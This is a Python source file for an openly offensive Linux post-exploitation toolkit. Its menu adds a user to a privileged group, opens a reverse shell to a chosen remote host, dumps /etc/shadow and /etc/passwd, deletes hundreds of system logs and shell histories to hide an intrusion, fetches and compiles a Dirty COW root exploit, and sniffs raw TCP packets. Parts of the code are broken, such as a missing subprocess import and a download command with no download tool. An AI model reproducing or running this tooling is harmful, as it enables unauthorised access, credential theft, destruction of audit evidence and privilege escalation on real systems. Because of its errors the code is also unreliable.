#!/usr/bin/python 
# -*- coding: utf-8 -*-


import os 
import socket
import sys 
from struct import *



R='\033[1;31m'
B='\033[1;34m'
Y='\033[1;33m'
G='\033[1;32m'
C='\033[1;36m'
N='\033[0m' 

def main():
	
	print \
"""
\033[01;33m   .x+=:.         ..                _                                  \033[0m
\033[01;33m  z`    ^%  x .d88"                u            ..                     \033[0m
\033[01;33m     .   <k  5888R                88Nu.   u.   @L                      \033[0m
\033[01;33m   .@8Ned8"  '888R         u     '88888.o888c 9888i   .dL        u     \033[0m
\033[01;32m .@^%8888"    888R      us888u.   ^8888  8888 `Y888k:*888.    us888u.  \033[0m
\033[01;32mx88:  `)8b.   888R   .@88 "8888"   8888  8888   888E  888I .@88 "8888" \033[0m
\033[01;32m8888N=*8888   888R   9888  9888    8888  8888   888E  888I 9888  9888  \033[0m
\033[01;31m %8"    R88   888R   9888  9888    8888  8888   888E  888I 9888  9888  \033[0m
\033[01;31m  @8Wou 9%    888R   9888  9888   .8888b.888P   888E  888I 9888  9888  \033[0m
\033[01;34m.888888P`    .888B . 9888  9888    ^Y8888*""   x888N><888' 9888  9888  \033[0m
\033[01;34m`   ^"F      ^*888%  "888*""888"     `Y"        "88"  888  "888*""888" \033[0m
\033[01;34m               "%     ^Y"   ^Y'                       88F   ^Y"   ^Y'  \033[0m
\033[01;34m                                                     98"               \033[0m
\033[01;0m                                                   ./"                 \033[0m
																									  
	~ Post Exploitation Script Written For Linux Based Systems  ~ 

[---]                  Created by Souhardya Sardar                          [---]
[---]                     github.com/Souhardya                              [---]


LEGAL WARNING: While this may be helpful for some, there are significant risks.
You could go to jail on obstruction of justice charges just for running Slavya,
even though you are innocent. Use with caution.

[1] Add New User Group 
[2] Reverse TCP Shell
[3] Read Sensitive Files
[4] Clean All System Logs
[5] Try to gain Root :) 
[6] Initialize Packet Sniffer


"""

	global option
	option = raw_input('Choose from the following options #~: ')
 
	if option:
		if option == '1':
		  adduser()

		elif option == '2':
			reverse_tcp_shell()

		elif option == '3':
			sensitive_files() 

		elif option == "4":
			logclear()	

		elif option == "5":
			rootexploit()

		elif option == "6":
			sniffer()

		
				   
				
		else:
			print '\nInvalid Choice\n'
			main()    
 
	else:
		print '\nYou Must Enter An Option (Check if your typo is corrected.)\n'
		main()


def adduser():
	print \
	"""

██████╗ ██╗   ██╗██╗  ██╗██╗████████╗
██╔══██╗╚██╗ ██╔╝██║ ██╔╝██║╚══██╔══╝
██████╔╝ ╚████╔╝ █████╔╝ ██║   ██║   
██╔═══╝   ╚██╔╝  ██╔═██╗ ██║   ██║   
██║        ██║   ██║  ██╗██║   ██║   
╚═╝        ╚═╝   ╚═╝  ╚═╝╚═╝   ╚═╝   
									 
 ~ Helps you to create user on the system without any hurdles ~ 

"""	

	Username = raw_input("[!] Please input the username you want to continue with:")
	Password = raw_input("[!] Please input the password you want to continue with:")


	os.system("adduser %s" %Username)
	os.system("passwd %s"%Password)
	os.system("groupadd wheel")
	os.system("usermod -a -G %s"%Username)
	os.system("su - %s"%Username)
	print "User id created %s using password %s" % (Username, Password)


def reverse_tcp_shell():

	print \
"""
██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗    ████████╗ ██████╗██████╗     
██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝    ╚══██╔══╝██╔════╝██╔══██╗    
██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗         ██║   ██║     ██████╔╝    
██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝         ██║   ██║     ██╔═══╝     
██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗       ██║   ╚██████╗██║         
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝       ╚═╝    ╚═════╝╚═╝         
																						  
			 Reverse Shell TCP to connect to a external host 
						
"""

	Host = raw_input("Please input the remote host you want to connect:")
	Port = raw_input("Please input the remote port you want to connect:")

	try:
		Port = int(Port)
	 
	except ValueError:
		print "You didn't enter an integer."

	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect((Host, Port))
	print "Connected to host %s on port %s" %(Host, Port)

	while True:
		data = s.recv(1024)
	
		if data[:].decode("utf-8") == "cd":
			try:
				os.chdir(os.path.dirname(sys.argv[0]))
			except OSError:
				s.send("Client is already in starting directory!" + str(os.getcwd()) + "> ")
		elif data[:3].decode("utf-8") == "cd ":
			try:
			
				os.chdir(data[3:].decode("utf-8"))
			except OSError:
				s.send("Directory does not exist: " + str.encode(str(OSError) + str(os.getcwd()) + "> "))
	
		elif data[:].decode("utf-8") == 'killit':
			s.send("Closing Connection...")
			s.close()
			break
	
		if len(data) > 0:
			cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			output_bytes = cmd.stdout.read() + cmd.stderr.read()
			output_str = str(output_bytes)
			s.send(str.encode(output_str + "\n" + str(os.getcwd()) + "> "))
			print(output_str)




def sensitive_files():

	print \
"""
	
███████╗██╗██╗     ███████╗    ██████╗ ██╗███████╗ ██████╗██╗      ██████╗ ███████╗██╗   ██╗██████╗ ███████╗
██╔════╝██║██║     ██╔════╝    ██╔══██╗██║██╔════╝██╔════╝██║     ██╔═══██╗██╔════╝██║   ██║██╔══██╗██╔════╝
█████╗  ██║██║     █████╗      ██║  ██║██║███████╗██║     ██║     ██║   ██║███████╗██║   ██║██████╔╝█████╗  
██╔══╝  ██║██║     ██╔══╝      ██║  ██║██║╚════██║██║     ██║     ██║   ██║╚════██║██║   ██║██╔══██╗██╔══╝  
██║     ██║███████╗███████╗    ██████╔╝██║███████║╚██████╗███████╗╚██████╔╝███████║╚██████╔╝██║  ██║███████╗
╚═╝     ╚═╝╚══════╝╚══════╝    ╚═════╝ ╚═╝╚══════╝ ╚═════╝╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
																											
[---]      Read Sensitive Files in host specially crafted for CTF Playups   [---]

[1] Passwd File 

[2] Shadow File

[3] Vsftpd Config. File

[4] SSH Config. File

[5] Apache Conf. File 


"""


	global option
	option = raw_input(' Choose from the following options: ')
 
	if option:
		if option == '2':
			shadow()
			
		elif option == '1':
			passwd()
			


def shadow():
	f = open('/etc/shadow','r')
	for i in f:
		print i.strip('\n')



def passwd():

	f = open('/etc/passwd','r')
	for i in f:
		print i.strip('\n')


def vsftpd():
	f = open('/etc/vsftpd.conf','r')
	for i in f:
		print i.strip('\n')

def ssh():
	f = open('/etc/ssh/sshd_config','r')
	for i in f:
		print i.strip('\n')

def apache():
	f = open('/etc/apache2/apache2.conf','r')
	for i in f:
		print i.strip('\n')



def logclear():

	print \
"""


██╗      ██████╗  ██████╗      ██████╗██╗     ███████╗ █████╗ ███╗   ██╗███████╗██████╗ 
██║     ██╔═══██╗██╔════╝     ██╔════╝██║     ██╔════╝██╔══██╗████╗  ██║██╔════╝██╔══██╗
██║     ██║   ██║██║  ███╗    ██║     ██║     █████╗  ███████║██╔██╗ ██║█████╗  ██████╔╝
██║     ██║   ██║██║   ██║    ██║     ██║     ██╔══╝  ██╔══██║██║╚██╗██║██╔══╝  ██╔══██╗
███████╗╚██████╔╝╚██████╔╝    ╚██████╗███████╗███████╗██║  ██║██║ ╚████║███████╗██║  ██║
╚══════╝ ╚═════╝  ╚═════╝      ╚═════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
																						
					~ Hide your ass before its too late LOL :) ~
									
""" 
	os.system("rm -rf '/var/adm/utmp','/usr/adm/utmp','/etc/utmp','/var/log/utmp','/var/run/utmp','/var/adm/utmp','/var/run/utmp','/usr/var/adm/utmp','/var/adm/wtmp','/usr/adm/wtmp','/etc/wtmp','/var/log/wtmp','/var/adm/wtmp','/var/run/wtmp','/usr/var/adm/wtmp','/var/adm/utmpx','/usr/adm/utmpx','/usr/run/utmpx','/etc/utmpx','/var/log/utmpx','/var/run/utmpx','/usr/var/adm/utmpx','/var/adm/wtmpx','/usr/adm/wtmpx','/etc/wtmpx','/var/log/wtmpx','/var/run/wtmpx','/usr/adm/wtmpx','/usr/var/adm/wtmpx','/var/adm/lastlog','/usr/adm/lastlog','/etc/lastlog','/var/log/lastlog','/usr/adm/lastlog','/usr/run/lastlog','/usr/var/adm/lastlog','/var/adm/pacct','/var/account/pacct','/var/log/acct','/var/log/pacct','/var/adm/acct','/var/adm/pacct','/var/account/acct','/usr/adm/acct','/var/log/prelude.log','/var/log/prelude/prelude.log','/var/adm/prelude/prelude.log','/var/adm/prelude/log/prelude.log','/var/adm/log/prelude.log','/var/ids/log/prelude.log','/var/ids/prelude/log/prelude.log','/var/ids/prelude.log','/var/prelude/prelude.log','/var/prelude/log/prelude.log','/home/log/prelude.log','/home/ids/log/prelude.log','/home/prelude/log/prelude.log','/home/ids/prelude.log','/home/prelude/prelude.log','/home/log/prelude.log','/usr/local/var/log/prelude.log','/var/log/prelude-xml.log','/var/log/prelude/prelude-xml.log','/var/adm/prelude/prelude-xml.log','/var/adm/prelude/log/prelude-xml.log','/var/adm/log/prelude-xml.log','/var/ids/log/prelude-xml.log','/var/ids/prelude/log/prelude-xml.log','/var/ids/prelude-xml.log','/var/prelude/prelude-xml.log','/var/prelude/log/prelude-xml.log','/home/log/prelude-xml.log','/home/ids/log/prelude-xml.log','/home/prelude/log/prelude-xml.log','/home/ids/prelude-xml.log','/home/prelude/prelude-xml.log','/home/log/prelude-xml.log','/usr/local/var/log/prelude-xml.log','/var/log/samba/log.smbd','/var/log/samba/log.nmbd','/var/log/log.smbd','/var/log/log.nmbd','/var/log/smb/log.smbd','/var/log/smb/log.nmbd','/home/samba/log.smbd','/home/samba/log.nmbd','/home/samba/log/log.smbd','/home/samba/log/log.nmbd','/home/samba/logs/log.smbd','/home/samba/logs/log.nmbd','/var/log/snort/snort.alert','/var/log/snort.alert','/var/log/ids/snort.alert','/var/ids/snort/snort.alert','/var/ids/snort.alert','/var/snort/snort.alert','/home/snort/snort.alert','/home/snort/log/snort.alert','/home/log/snort/snort.alert','/home/log/snort.alert','/home/ids/snort/snort.alert','/home/ids/snort.alert','/usr/local/ids/snort.alert','/usr/local/var/snort.alert','/usr/local/snort/snort.alert','/usr/local/var/log/snort.alert','/usr/local/snort/log/snort.alert','/usr/local/ids/log/snort.alert','/usr/local/log/snort.alert','/usr/local/log/snort/snort.alert','/var/log/apache2/audit_log','/var/log/apache1/audit_log','/var/log/apache/audit_log','/home/apache2/log/audit_log','/home/apache1/log/audit_log','/home/apache/log/audit_log','/home/http/log/audit_log','/home/httpd/log/audit_log','/var/log/http/audit_log','/var/log/httpd/audit_log','/usr/http/log/audit_log','/usr/httpd/log/audit_log','/usr/local/http/log/audit_log','/usr/local/httpd/log/audit_log','/usr/local/apache/log/audit_log','/usr/local/apache2/log/audit_log','/usr/local/apache1/log/audit_log','/var/www/log/audit_log','/var/http/log/audit_log','/var/httpd/log/audit_log','/var/apache/log/audit_log','/var/apache2/log/audit_log','/var/apache1/log/audit_log','/root/.bash_history','/root/.history','/root/.sh_history','/.bash_history','/.history','/.sh_history','/tmp/.bash_history','/tmp/.sh_history','/tmp/.history','/home/apache/.bash_history','/home/apache/.sh_history','/home/apache/.history','/home/apache1/.bash_history','/home/apache1/.sh_history','/home/apache1/.history','/home/apache2/.bash_history','/home/apache2/.sh_history','/home/apache2/.history','/home/httpd/.bash_history','/home/httpd/.sh_history','/home/httpd/.history','/home/ftpd/.bash_history','/home/ftpd/.sh_history','/home/ftpd/.history','/var/log/apache2/access_log','/var/log/apache2/access_log.1','/var/log/apache2/access_log.2','/var/log/apache2/error_log','/var/log/apache2/error_log.1'	,'/var/log/apache2/error_log.2','/var/log/apache2/ssl_access_log','/var/log/apache2/ssl_access_log.1','/var/log/apache2/ssl_access_log.2','/var/log/apache2/ssl_error_log','/var/log/apache2/ssl_request_log','/var/log/apache2/request_log','/var/log/apache/access_log','/var/log/apache/access_log.1','/var/log/apache/access_log.2','/var/log/apache/error_log','/var/log/apache/error_log.1','/var/log/apache/error_log.2','/var/log/apache/ssl_access_log','/var/log/apache/ssl_error_log','/var/log/apache/ssl_request_log','/var/log/apache/request_log','/var/log/apache1/access_log','/var/log/apache1/error_log','/var/log/apache1/ssl_access_log','/var/log/apache1/ssl_error_log','/var/log/apache1/ssl_request_log','/var/log/apache1/request_log','/var/www/log/access_log','/var/www/log/error_log','/var/www/log/ssl_access_log','/var/www/log/ssl_error_log','/var/www/log/ssl_request_log','/var/www/log/request_log','/var/apache2/access_log','/var/apache2/error_log','/var/apache2/ssl_access_log','/var/apache2/ssl_error_log','/var/apache2/ssl_request_log','/var/apache2/request_log','/home/apache2/access_log','/home/apache2/error_log','/home/apache2/ssl_access_log','/home/apache2/ssl_error_log','/home/apache2/ssl_request_log','/home/apache2/request_log','/var/web/log/access_log','/var/web/log/error_log','/var/web/log/ssl_access_log','/var/web/log/ssl_error_log','/var/web/log/ssl_request_log','/var/web/log/request_log','/var/apache/access_log','/var/apache/error_log','/var/apache/ssl_access_log','/var/apache/ssl_error_log','/var/apache/ssl_request_log','/var/apache/request_log','/home/apache/access_log','/home/apache/error_log','/home/apache/ssl_access_log','/home/apache/ssl_error_log','/home/apache/ssl_request_log','/home/apache/request_log','/var/apache1/access_log','/var/apache1/error_log','/var/apache1/ssl_access_log','/var/apache1/ssl_error_log','/var/apache1/ssl_request_log','/var/apache1/request_log','/home/apache1/access_log','/home/apache1/error_log','/home/apache1/ssl_access_log','/home/apache1/ssl_error_log','/home/apache1/ssl_request_log','/home/apache1/request_log','/usr/apache1/error_log','/usr/apache1/ssl_access_log','/usr/apache1/ssl_error_log','/usr/apache1/ssl_request_log','/usr/apache1/request_log','/usr/local/apache1/error_log','/usr/local/apache1/ssl_access_log','/usr/local/apache1/ssl_error_log','/usr/local/apache1/ssl_request_log','/usr/local/apache1/request_log','/usr/apache2/error_log','/usr/apache2/ssl_access_log','/usr/apache2/ssl_error_log','/usr/apache2/ssl_request_log','/usr/apache2/request_log','/usr/local/apache2/error_log','/usr/local/apache2/ssl_access_log','/usr/local/apache2/ssl_error_log','/usr/local/apache2/ssl_request_log','/usr/local/apache2/request_log','/usr/apache/error_log','/usr/apache/ssl_access_log','/usr/apache/ssl_error_log','/usr/apache/ssl_request_log','/usr/apache/request_log','/usr/local/apache/error_log','/usr/local/apache/ssl_access_log','/usr/local/apache/ssl_error_log','/usr/local/apache/ssl_request_log','/usr/local/apache/request_log','/usr/local/httpd/access_log','/usr/local/httpd/ssl_access_log','/usr/local/httpd/error_log','/usr/local/httpd/ssl_error_log','/usr/local/httpd/ssl_request_log','/home/httpd/access_log','/home/httpd/ssl_access_log','/home/httpd/error_log','/home/httpd/ssl_error_log','/var/adm/SYSLOG','/var/adm/sulog','/var/adm/utmp','/var/adm/utmpx','/var/adm/wtmp','/var/adm/wtmpx','/var/adm/lastlog/username','/usr/spool/lp/log','/var/adm/lp/lpd-errs','/usr/lib/cron/log','/var/adm/loginlog','/var/adm/pacct','/var/adm/dtmp','/var/adm/acct/sum/loginlog','/var/adm/X0msgs','/var/adm/crash/vmcore','/var/adm/crash/unix','/var/adm/pacct','/var/adm/wtmp','/var/adm/dtmp','/var/adm/qacct','/var/adm/sulog','/var/adm/ras/errlog','/var/adm/ras/bootlog','/var/adm/cron/log','/etc/utmp','/etc/security/lastlog','/etc/security/failedlogin','/usr/spool/mqueue/syslog','/var/adm/messages','/var/adm/aculogs','/var/adm/aculog','/var/adm/sulog','/var/adm/vold.log','/var/adm/wtmp','/var/adm/wtmpx','/var/adm/utmp','/var/adm/utmpx','/var/adm/log/asppp.log','/var/log/syslog','/var/log/POPlog','/var/log/authlog','/var/log/auth1.log','/var/adm/pacct','/var/lp/logs/lpsched','/var/lp/logs/lpNet','/var/lp/logs/requests','/var/cron/log','/var/saf/_log','/var/saf/port/log','/var/adm/utmp','/var/log/utmp','/var/run/utmp','/var/adm/utmp','/var/run/utmp','/usr/var/adm/utmp','/var/adm/wtmp','/var/log/wtmp','/etc/httpd/logs/error.log'")
	os.system("rm -rf '/var/adm/wtmp','/var/run/wtmp','/usr/var/adm/wtmp','/var/adm/utmpx','/var/log/utmpx','/var/run/utmpx','/usr/var/adm/utmpx','/var/adm/wtmpx','/var/log/wtmpx','/var/run/wtmpx','/usr/var/adm/wtmpx','/var/adm/lastlog','/var/log/lastlog','/usr/var/adm/lastlog','/var/adm/pacct','/var/account/pacct','/var/log/acct','/var/log/pacct','/var/adm/acct','/var/adm/pacct','/var/account/acct','/var/log/prelude.log','/var/log/prelude/prelude.log','/var/adm/prelude/prelude.log','/var/adm/prelude/log/prelude.log','/var/adm/log/prelude.log','/var/ids/log/prelude.log','/var/ids/prelude/log/prelude.log','/var/ids/prelude.log','/var/prelude/prelude.log','/var/prelude/log/prelude.log','/usr/local/var/log/prelude.log','/var/log/prelude-xml.log','/var/log/prelude/prelude-xml.log','/var/adm/prelude/prelude-xml.log','/var/adm/prelude/log/prelude-xml.log','/var/adm/log/prelude-xml.log','/var/ids/log/prelude-xml.log','/var/ids/prelude/log/prelude-xml.log','/var/ids/prelude-xml.log','/var/prelude/prelude-xml.log','/var/prelude/log/prelude-xml.log','/usr/local/var/log/prelude-xml.log','/var/log/samba/log.smbd','/var/log/samba/log.nmbd','/var/log/log.smbd','/var/log/log.nmbd','/var/log/smb/log.smbd','/var/log/smb/log.nmbd','/var/log/snort/snort.alert','/var/log/snort.alert','/var/log/ids/snort.alert','/var/ids/snort/snort.alert','/var/ids/snort.alert','/var/snort/snort.alert','/usr/local/var/snort.alert','/usr/local/var/log/snort.alert','/var/log/apache2/audit_log','/var/log/apache1/audit_log','/var/log/apache/audit_log','/var/log/http/audit_log','/var/log/httpd/audit_log','/var/www/log/audit_log','/var/http/log/audit_log','/var/httpd/log/audit_log','/var/apache/log/audit_log','/var/apache2/log/audit_log','/var/apache1/log/audit_log','/var/log/apache2/access_log','/var/log/apache2/access_log.1','/var/log/apache2/access_log.2','/var/log/apache2/error_log','/var/log/apache2/error_log.1'")
	os.system("rm -rf '/var/log/apache2/error_log.2','/var/log/apache2/ssl_access_log','/var/log/apache2/ssl_access_log.1','/var/log/apache2/ssl_access_log.2','/var/log/apache2/ssl_error_log','/var/log/apache2/ssl_request_log','/var/log/apache2/request_log','/var/log/apache/access_log','/var/log/apache/access_log.1','/var/log/apache/access_log.2','/var/log/apache/error_log','/var/log/apache/error_log.1','/var/log/apache/error_log.2','/var/log/apache/ssl_access_log','/var/log/apache/ssl_error_log','/var/log/apache/ssl_request_log','/var/log/apache/request_log','/var/log/apache1/access_log','/var/log/apache1/error_log','/var/log/apache1/ssl_access_log','/var/log/apache1/ssl_error_log','/var/log/apache1/ssl_request_log','/var/log/apache1/request_log','/var/www/log/access_log','/var/www/log/error_log','/var/www/log/ssl_access_log','/var/www/log/ssl_error_log','/var/www/log/ssl_request_log','/var/www/log/request_log','/var/apache2/access_log','/var/apache2/error_log','/var/apache2/ssl_access_log','/var/apache2/ssl_error_log','/var/apache2/ssl_request_log','/var/apache2/request_log','/var/web/log/access_log','/var/web/log/error_log','/var/web/log/ssl_access_log','/var/web/log/ssl_error_log','/var/web/log/ssl_request_log','/var/web/log/request_log','/var/apache/access_log','/var/apache/error_log','/var/apache/ssl_access_log','/var/apache/ssl_error_log','/var/apache/ssl_request_log','/var/apache/request_log','/var/apache1/access_log','/var/apache1/error_log','/var/apache1/ssl_access_log','/var/apache1/ssl_error_log','/var/apache1/ssl_request_log','/var/apache1/request_log','/var/log','/var/adm','/var/spool/mqueue','/var/mail','/var/log/emerge.log','/var/log/Xorg.0.log','/root/.bash_history','/root/.bash_logout','/usr/local/apache/logs','/usr/local/apache/log','/var/apache/logs','/var/apache/log','/var/run/utmp','/var/logs','/var/log','/var/adm','/etc/wtmp','/etc/utmp','/var/log/lastlog','/var/log/syslog','/var/log/messages','/var/log/httpd/access_log','/var/log/httpd/access.log','/var/log/httpd/error_log','/var/log/httpd/error.log','/var/log/apache2/access_log','/var/log/apache2/access.log','/var/log/apache2/error.log','/var/log/apache2/error_log','/var/log/wtmp','/var/log/secure','/var/log/xferlog','/var/log/auth.log','/var/log/lighttpd/lighttpd.error.log','/var/log/lighttpd/lighttpd.access.log','/var/run/utmp','/var/www/logs/access_log','/var/www/logs/access.log','/var/www/logs/error_log','/var/www/logs/error.log','/var/log/apache/access_log','/var/log/apache/access.log','/var/log/apache/error_log','/var/log/apache/error.log','/var/log/yum.log','/etc/httpd/logs/access_log','/etc/httpd/logs/access.log','/etc/httpd/logs/error_log'")
	
	'''
	asfsfafasfasf
	
	
	
	
	
	,,
	
	
	'''



def rootexploit():
	print \
	"""

██████╗  ██████╗  ██████╗ ████████╗     ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝     ██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██████╔╝██║   ██║██║   ██║   ██║ █████╗ ███████╗██████╔╝██║     ██║   ██║██║   ██║   
██╔══██╗██║   ██║██║   ██║   ██║ ╚════╝ ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
██║  ██║╚██████╔╝╚██████╔╝   ██║        ███████║██║     ███████╗╚██████╔╝██║   ██║   
╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝       ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
																				   
							~  Same old Dirty Cow :3 ~
									   Mo000 


"""    
		

	os.system("https://raw.githubusercontent.com/Mester19/DirtyCOW/master/dirtycow.c && chmod 777 dirtycow.c && gcc -o dirtycow dirtycow.c -lpthread -Wall && chmod 777 dirtycow && ./dirtycow")
	print "Using dirty cow exploit if it works you will get a root shell spawned <3"

	

def sniffer():
	
	print \
	"""

██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗    ███████╗███╗   ██╗██╗███████╗███████╗
██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝    ██╔════╝████╗  ██║██║██╔════╝██╔════╝
██████╔╝███████║██║     █████╔╝ █████╗     ██║       ███████╗██╔██╗ ██║██║█████╗  █████╗  
██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║       ╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝  
██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║       ███████║██║ ╚████║██║██║     ██║     
╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝       ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝     
																						  
							~ Sniff all the TCP Packets ~  



"""


	try: # Credits to Anshul sir :) https://github.com/anshulbehl/pycon_sniffer/blob/master/tcp_sniffer.py
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
	except socket.error , msg:
		print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
		sys.exit()

	while True:
			packet = s.recvfrom(65565)
	
			packet = packet[0]
			ip_header = packet [0:20]
			iph = unpack('!BBHHHBBH4s4s' , ip_header)
			version_ihl = iph[0]
			version = version_ihl >> 4
			ihl = version_ihl & 0xF
			iph_length = ihl * 4
			ttl = iph[5]
			protocol = iph[6]
			s_addr = socket.inet_ntoa(iph[8]);
			d_addr = socket.inet_ntoa(iph[9]);
			tcp_header = packet[iph_length:iph_length+20]
			tcph = unpack('!HHLLBBHHH' , tcp_header)
			source_port = tcph[0]
			dest_port = tcph[1]
			sequence = tcph[2]
			acknowledgement = tcph[3]
			doff_reserved = tcph[4]
			tcph_length = doff_reserved >> 4
			print 'Version : ' + str(version) + ' IP Header Length : ' + str(ihl) + ' TTL : ' + str(ttl) + ' Protocol : ' + str(protocol) + ' Source Address : ' + str(s_addr) + ' Destination Address : ' + str(d_addr)
			print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Sequence Number : ' + str(sequence) + ' Acknowledgement : ' + str(acknowledgement) + ' TCP header length : ' + str(tcph_length)
			h_size = iph_length + tcph_length * 4
			data_size = len(packet) - h_size
			data = packet[h_size:]
			print 'Data : ' + data
			print




if __name__ == '__main__':
	main()
